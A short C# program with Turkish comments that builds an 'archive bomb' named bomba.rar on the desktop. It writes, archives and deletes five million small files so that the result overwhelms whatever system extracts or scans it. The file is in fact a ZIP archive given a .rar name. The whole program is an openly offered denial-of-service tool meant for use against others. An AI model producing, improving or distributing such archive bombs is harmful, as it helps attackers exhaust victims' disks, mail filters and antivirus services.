using System;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;

class Program
{
    static void Main(string[] args)
    {
        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string outputRarFile = Path.Combine(desktopPath, "bomba.rar");
        int numberOfFiles = 5000000; // rara ekleyeceğin dosya sayısı
        int batchSize = 10000; // her adımda eklenen dosya miktarı

        try
        {
            using (var archive = ZipFile.Open(outputRarFile, ZipArchiveMode.Create))
            {
                Parallel.For(0, numberOfFiles / batchSize, i =>
                {
                    int start = i * batchSize;
                    int end = Math.Min((i + 1) * batchSize, numberOfFiles);

                    for (int j = start; j < end; j++)
                    {
                        string fileName = $"file_{j}.txt";
                        string filePath = Path.Combine(desktopPath, fileName);

                        // dosyanın içine yazılacak yazı
                        File.WriteAllText(filePath, "bomba");

                        // rara dosyayı at
                        lock (archive)
                        {
                            archive.CreateEntryFromFile(filePath, fileName);
                        }


                        File.Delete(filePath);
                    }
                });
            }

            Console.WriteLine($"Rar bombası başarıyla oluşturuldu: {outputRarFile}");
        }
        catch (Exception ex)
        {
            Console.WriteLine("Hata oluştu: " + ex.Message);
        }

        Console.ReadLine();
    }
}
